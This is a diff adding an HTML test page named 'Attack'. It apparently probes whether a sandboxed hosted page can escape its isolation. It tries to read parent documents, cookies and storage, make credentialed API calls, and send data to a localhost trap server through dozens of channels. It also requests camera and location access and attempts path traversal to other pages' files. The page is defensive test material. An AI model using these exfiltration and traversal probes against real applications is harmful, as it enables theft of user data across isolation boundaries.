@@ -1,0 +1,59 @@
+<!doctype html><html><head><meta charset="utf-8"><title>Attack</title></head><body><h1>Attack</h1>
+<script>
+const who = new URLSearchParams(location.search).get('who'), TRAP = 'http://localhost:8799/' + who, APP = 'http://localhost:8797';
+const results = {};
+const attempt = async (name, run) => {
+  try { const value = await Promise.race([run(), new Promise((r) => setTimeout(r, 1500, 'nothing'))]); results[name] = value === undefined ? 'nothing' : String(value); }
+  catch (error) { results[name] = 'error'; }
+};
+const el = (tag, set, parentNode = document.body) => { const e = document.createElement(tag); Object.assign(e, set); parentNode.append(e); return e; };
+(async () => {
+  // Reading the app, its cookies, or any storage.
+  await attempt('parent document', () => 'LEAK ' + parent.document.title);
+  await attempt('top document', () => 'LEAK ' + top.document.title);
+  await attempt('parent location', () => 'LEAK ' + parent.location.href);
+  await attempt('parent storage', () => 'LEAK ' + parent.localStorage.length);
+  await attempt('cookie', () => (document.cookie ? 'LEAK ' + document.cookie : 'nothing'));
+  await attempt('set cookie', () => { document.cookie = 'a=b'; return document.cookie ? 'LEAK' : 'nothing'; });
+  await attempt('localStorage', () => 'LEAK ' + localStorage.length);
+  await attempt('sessionStorage', () => 'LEAK ' + sessionStorage.length);
+  await attempt('indexedDB', () => new Promise((resolve, reject) => { const r = indexedDB.open('x'); r.onsuccess = () => resolve('LEAK'); r.onerror = reject; }));
+  await attempt('caches', async () => { await caches.open('x'); return 'LEAK'; });
+  await attempt('service worker', async () => { await navigator.serviceWorker.register('sw.js'); return 'LEAK'; });
+  await attempt('worker', () => new Promise((resolve, reject) => { const w = new Worker(URL.createObjectURL(new Blob(['postMessage(1)']))); w.onmessage = () => resolve('LEAK'); w.onerror = reject; }));
+  // The API, with whatever the browser would send.
+  for (const path of ['/v1/me', '/app-api/projects', '/']) await attempt('fetch ' + path, async () => 'LEAK ' + (await fetch(APP + path, { credentials: 'include' })).status);
+  await attempt('xhr api', () => new Promise((resolve, reject) => { const x = new XMLHttpRequest(); x.open('GET', APP + '/v1/me'); x.withCredentials = true; x.onload = () => resolve('LEAK'); x.onerror = reject; x.send(); }));
+  // Sending anything out.
+  await attempt('fetch', async () => { await fetch(TRAP + '/fetch', { mode: 'no-cors' }); return 'LEAK'; });
+  await attempt('keepalive', async () => { await fetch(TRAP + '/keepalive', { mode: 'no-cors', keepalive: true, method: 'POST', body: 'x' }); return 'LEAK'; });
+  await attempt('beacon', () => { navigator.sendBeacon(TRAP + '/beacon', 'x'); });
+  await attempt('websocket', () => new Promise((resolve, reject) => { const w = new WebSocket(TRAP.replace('http', 'ws') + '/websocket'); w.onopen = () => resolve('LEAK'); w.onerror = reject; }));
+  await attempt('eventsource', () => new Promise((resolve, reject) => { const s = new EventSource(TRAP + '/eventsource'); s.onopen = () => resolve('LEAK'); s.onerror = reject; }));
+  await attempt('import', async () => { await import(TRAP + '/import'); return 'LEAK'; });
+  el('img', { src: TRAP + '/img' }); el('script', { src: TRAP + '/script' }); el('link', { rel: 'stylesheet', href: TRAP + '/stylesheet' }, document.head);
+  el('link', { rel: 'icon', href: TRAP + '/icon' }, document.head); el('link', { rel: 'manifest', href: TRAP + '/manifest' }, document.head);
+  el('link', { rel: 'preload', as: 'image', href: TRAP + '/preload' }, document.head); el('link', { rel: 'prefetch', href: TRAP + '/prefetch' }, document.head);
+  el('link', { rel: 'modulepreload', href: TRAP + '/modulepreload' }, document.head); el('link', { rel: 'prerender', href: TRAP + '/prerender' }, document.head);
+  el('style', { textContent: `@import url(${TRAP}/css-import); @font-face { font-family: f; src: url(${TRAP}/font); } body { font-family: f; background: url(${TRAP}/css-image); }` }, document.head);
+  el('iframe', { src: TRAP + '/iframe' }); el('iframe', { srcdoc: `<img src="${TRAP}/srcdoc">` }); el('object', { data: TRAP + '/object' }); el('embed', { src: TRAP + '/embed' });
+  el('video', { src: TRAP + '/video', poster: TRAP + '/poster', autoplay: true, muted: true }); el('audio', { src: TRAP + '/audio', preload: 'auto' });
+  el('input', { type: 'image', src: TRAP + '/input-image' });
+  document.body.insertAdjacentHTML('beforeend', `<svg><image href="${TRAP}/svg-image"/><use href="${TRAP}/svg-use#a"/></svg><table background="${TRAP}/table"></table><picture><source srcset="${TRAP}/srcset"><img></picture>`);
+  el('script', { type: 'speculationrules', textContent: JSON.stringify({ prefetch: [{ urls: [TRAP + '/speculation'] }] }) });
+  await attempt('popup', () => (window.open(TRAP + '/popup') ? 'LEAK' : 'nothing'));
+  await attempt('popup here', () => (window.open(TRAP + '/popup-parent', '_parent') ? 'LEAK' : 'nothing'));
+  await attempt('alert', () => { const before = Date.now(); alert('x'); return Date.now() - before > 1000 ? 'LEAK' : 'nothing'; });
+  await attempt('fullscreen', async () => { await document.documentElement.requestFullscreen(); return 'LEAK'; });
+  await attempt('camera', async () => { await navigator.mediaDevices.getUserMedia({ video: true }); return 'LEAK'; });
+  await attempt('geolocation', () => new Promise((resolve, reject) => navigator.geolocation.getCurrentPosition(() => resolve('LEAK'), reject)));
+  await attempt('pointer lock', () => { document.body.requestPointerLock(); return document.pointerLockElement ? 'LEAK' : 'nothing'; });
+  // Other pages' files, without their token.
+  const token = location.pathname.split('/')[1], other = 'ver_' + '1'.repeat(26);
+  for (const path of ['/' + other + '/index.html', '/' + token.replace(/^[^.]+/, other) + '/index.html', '/' + token + '/../index.html', '/' + token + '/%2e%2e/x'])
+    await attempt('file ' + path.slice(0, 6) + path.length, async () => { const r = await fetch(path); return r.ok ? 'LEAK' : 'nothing'; });
+  await attempt('own file', async () => ((await fetch('index.html')).ok ? 'works' : 'nothing'));
+  await new Promise((r) => setTimeout(r, 1500));
+  parent.postMessage({ type: 'result', result: results }, '*');
+})();
+</script></body></html>
